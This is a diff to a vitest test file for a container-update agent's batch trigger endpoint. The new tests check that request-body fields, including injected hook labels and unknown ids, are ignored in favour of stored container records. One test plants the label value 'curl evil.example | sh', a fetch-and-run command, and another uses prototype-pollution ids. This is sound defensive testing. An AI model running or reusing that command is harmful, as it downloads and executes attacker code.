@@ -2,6 +2,7 @@ import { beforeEach, describe, expect, test } from 'vitest';
 import { mapComponentsToList } from '../../api/component.js';
 import * as apiTrigger from '../../api/trigger.js';
 import * as registry from '../../registry/index.js';
+import * as storeContainer from '../../store/container.js';
 import * as triggerApi from './trigger.js';
 
 const { mockLoggerChild, mockLogError } = vi.hoisted(() => ({
@@ -24,6 +25,10 @@ vi.mock('../../registry/index.js', () => ({
   getState: vi.fn(),
 }));
 
+vi.mock('../../store/container.js', () => ({
+  getContainer: vi.fn(),
+}));
+
 vi.mock('../../api/trigger.js', () => ({
   runTrigger: vi.fn(),
 }));
@@ -39,6 +44,7 @@ describe('agent API trigger', () => {
   beforeEach(() => {
     vi.clearAllMocks();
     req = { params: {}, body: {} };
+    storeContainer.getContainer.mockImplementation((id) => ({ id, labels: {} }));
     res = {
       json: vi.fn(),
       status: vi.fn().mockReturnThis(),
@@ -93,19 +99,62 @@ describe('agent API trigger', () => {
       expect(res.status).toHaveBeenCalledWith(404);
     });
 
-    test('should call triggerBatch and strip agent fields', async () => {
+    const stored = (id: string) => ({ id, labels: {} });
+    const mockTriggerWith = () => {
+      const mockTrigger = { triggerBatch: vi.fn().mockResolvedValue(undefined) };
+      registry.getState.mockReturnValue({ trigger: { 'docker.update': mockTrigger } });
+      return mockTrigger;
+    };
+
+    test('should run the batch on the stored containers and ignore body fields', async () => {
       req.params = { type: 'docker', name: 'update' };
       req.body = [{ id: 'c1', agent: 'remote' }, { id: 'c2' }];
-      const mockTrigger = { triggerBatch: vi.fn().mockResolvedValue(undefined) };
-      registry.getState.mockReturnValue({
-        trigger: { 'docker.update': mockTrigger },
-      });
+      const mockTrigger = mockTriggerWith();
       await triggerApi.runTriggerBatch(req, res);
       expect(mockTrigger.triggerBatch).toHaveBeenCalledWith(
-        [{ id: 'c1' }, { id: 'c2' }],
+        [stored('c1'), stored('c2')],
         undefined,
       );
       expect(res.status).toHaveBeenCalledWith(200);
+    });
+
+    test('should ignore body labels and hand the trigger the stored container', async () => {
+      req.params = { type: 'docker', name: 'update' };
+      req.body = [{ id: 'c1', labels: { 'dd.hook.pre': 'curl evil.example | sh' } }];
+      const storedC1 = { id: 'c1', labels: { 'dd.watch': 'true' } };
+      storeContainer.getContainer.mockReturnValue(storedC1);
+      const mockTrigger = mockTriggerWith();
+      await triggerApi.runTriggerBatch(req, res);
+      expect(storeContainer.getContainer).toHaveBeenCalledWith('c1');
+      const passed = mockTrigger.triggerBatch.mock.calls[0][0];
+      expect(passed[0]).toBe(storedC1);
+      expect(passed[0].labels['dd.hook.pre']).toBeUndefined();
+      expect(res.status).toHaveBeenCalledWith(200);
+    });
+
+    test('should return 404 and run nothing when any id is unknown', async () => {
+      req.params = { type: 'docker', name: 'update' };
+      req.body = [{ id: 'c1' }, { id: 'ghost' }, { id: 42 }];
+      storeContainer.getContainer.mockImplementation((id) =>
+        id === 'ghost' ? undefined : stored(id),
+      );
+      const mockTrigger = mockTriggerWith();
+      await triggerApi.runTriggerBatch(req, res);
+      expect(res.status).toHaveBeenCalledWith(404);
+      expect(res.json).toHaveBeenCalledWith(
+        expect.objectContaining({ error: 'Container not found' }),
+      );
+      expect(mockTrigger.triggerBatch).not.toHaveBeenCalled();
+    });
+
+    test('should return 404 for entries that are not objects with a usable id', async () => {
+      req.params = { type: 'docker', name: 'update' };
+      req.body = [null, { id: '' }];
+      const mockTrigger = mockTriggerWith();
+      await triggerApi.runTriggerBatch(req, res);
+      expect(res.status).toHaveBeenCalledWith(404);
+      expect(storeContainer.getContainer).not.toHaveBeenCalled();
+      expect(mockTrigger.triggerBatch).not.toHaveBeenCalled();
     });
 
     test('should extract operationId fields and pass as runtimeContext (#289)', async () => {
@@ -114,12 +163,9 @@ describe('agent API trigger', () => {
         { id: 'c1', operationId: 'op-uuid-1', agent: 'remote' },
         { id: 'c2', operationId: 'op-uuid-2' },
       ];
-      const mockTrigger = { triggerBatch: vi.fn().mockResolvedValue(undefined) };
-      registry.getState.mockReturnValue({
-        trigger: { 'docker.update': mockTrigger },
-      });
+      const mockTrigger = mockTriggerWith();
       await triggerApi.runTriggerBatch(req, res);
-      expect(mockTrigger.triggerBatch).toHaveBeenCalledWith([{ id: 'c1' }, { id: 'c2' }], {
+      expect(mockTrigger.triggerBatch).toHaveBeenCalledWith([stored('c1'), stored('c2')], {
         operationIds: new Map([
           ['c1', 'op-uuid-1'],
           ['c2', 'op-uuid-2'],
@@ -131,13 +177,10 @@ describe('agent API trigger', () => {
     test('should pass undefined runtimeContext when no container has operationId (#289)', async () => {
       req.params = { type: 'docker', name: 'update' };
       req.body = [{ id: 'c1' }, { id: 'c2' }];
-      const mockTrigger = { triggerBatch: vi.fn().mockResolvedValue(undefined) };
-      registry.getState.mockReturnValue({
-        trigger: { 'docker.update': mockTrigger },
-      });
+      const mockTrigger = mockTriggerWith();
       await triggerApi.runTriggerBatch(req, res);
       expect(mockTrigger.triggerBatch).toHaveBeenCalledWith(
-        [{ id: 'c1' }, { id: 'c2' }],
+        [stored('c1'), stored('c2')],
         undefined,
       );
       expect(res.status).toHaveBeenCalledWith(200);
@@ -149,16 +192,11 @@ describe('agent API trigger', () => {
         { id: 'c1', operationId: '' },
         { id: 'c2', operationId: 'op-uuid-2' },
       ];
-      const mockTrigger = { triggerBatch: vi.fn().mockResolvedValue(undefined) };
-      registry.getState.mockReturnValue({
-        trigger: { 'docker.update': mockTrigger },
-      });
+      const mockTrigger = mockTriggerWith();
       await triggerApi.runTriggerBatch(req, res);
-      // c1 has empty-string operationId — skipped; only c2 contributes
-      expect(mockTrigger.triggerBatch).toHaveBeenCalledWith(
-        [{ id: 'c1', operationId: '' }, { id: 'c2' }],
-        { operationIds: new Map([['c2', 'op-uuid-2']]) },
-      );
+      expect(mockTrigger.triggerBatch).toHaveBeenCalledWith([stored('c1'), stored('c2')], {
+        operationIds: new Map([['c2', 'op-uuid-2']]),
+      });
       expect(res.status).toHaveBeenCalledWith(200);
     });
 
@@ -170,14 +208,8 @@ describe('agent API trigger', () => {
         { id: 'prototype', operationId: 'op-evil-3' },
         { id: 'c-safe', operationId: 'op-safe' },
       ];
-      const mockTrigger = { triggerBatch: vi.fn().mockResolvedValue(undefined) };
-      registry.getState.mockReturnValue({
-        trigger: { 'docker.update': mockTrigger },
-      });
+      const mockTrigger = mockTriggerWith();
       await triggerApi.runTriggerBatch(req, res);
-      // All four entries are stored as Map keys (Maps have no prototype chain
-      // so these reserved names are inert), but the runtimeContext is a Map
-      // and Object.prototype remains untouched.
       const call = mockTrigger.triggerBatch.mock.calls[0];
       const operationIds = call[1].operationIds as Map<string, string>;
       expect(operationIds).toBeInstanceOf(Map);
@@ -185,33 +217,8 @@ describe('agent API trigger', () => {
       expect(operationIds.get('constructor')).toBe('op-evil-2');
       expect(operationIds.get('prototype')).toBe('op-evil-3');
       expect(operationIds.get('c-safe')).toBe('op-safe');
-      // Critical: prototype-pollution check.  After processing the malicious
-      // payload, an empty {} must not have inherited any of the values above.
       expect(({} as Record<string, unknown>).constructor).toBe(Object);
       expect((Object.prototype as Record<string, unknown>).polluted).toBeUndefined();
-      expect(res.status).toHaveBeenCalledWith(200);
-    });
-
-    test('should ignore non-string or empty container.id when building operationIds map (#289)', async () => {
-      req.params = { type: 'docker', name: 'update' };
-      req.body = [
-        { id: 42, operationId: 'op-numeric-id' },
-        { id: '', operationId: 'op-empty-id' },
-        { id: 'c-good', operationId: 'op-good' },
-      ];
-      const mockTrigger = { triggerBatch: vi.fn().mockResolvedValue(undefined) };
-      registry.getState.mockReturnValue({
-        trigger: { 'docker.update': mockTrigger },
-      });
-      await triggerApi.runTriggerBatch(req, res);
-      expect(mockTrigger.triggerBatch).toHaveBeenCalledWith(
-        [
-          { id: 42, operationId: 'op-numeric-id' },
-          { id: '', operationId: 'op-empty-id' },
-          { id: 'c-good' },
-        ],
-        { operationIds: new Map([['c-good', 'op-good']]) },
-      );
       expect(res.status).toHaveBeenCalledWith(200);
     });
 
@@ -355,23 +362,6 @@ describe('agent API trigger', () => {
       await triggerApi.runTriggerBatch(req, res);
       expect(res.json).toHaveBeenCalledWith(
         expect.objectContaining({ error: 'Trigger notfound not found' }),
-      );
-    });
-
-    test('should not modify container when agent field is absent', async () => {
-      // Kill 72:11 ConditionalExpression true mutant
-      req.params = { type: 'docker', name: 'update' };
-      const containerWithoutAgent = { id: 'c1', name: 'nginx' };
-      req.body = [containerWithoutAgent];
-      const mockTrigger = { triggerBatch: vi.fn().mockResolvedValue(undefined) };
-      registry.getState.mockReturnValue({
-        trigger: { 'docker.update': mockTrigger },
-      });
-      await triggerApi.runTriggerBatch(req, res);
-      // Container should be passed without extra modification; no operationIds so runtimeContext is undefined
-      expect(mockTrigger.triggerBatch).toHaveBeenCalledWith(
-        [expect.objectContaining({ id: 'c1', name: 'nginx' })],
-        undefined,
       );
     });
 
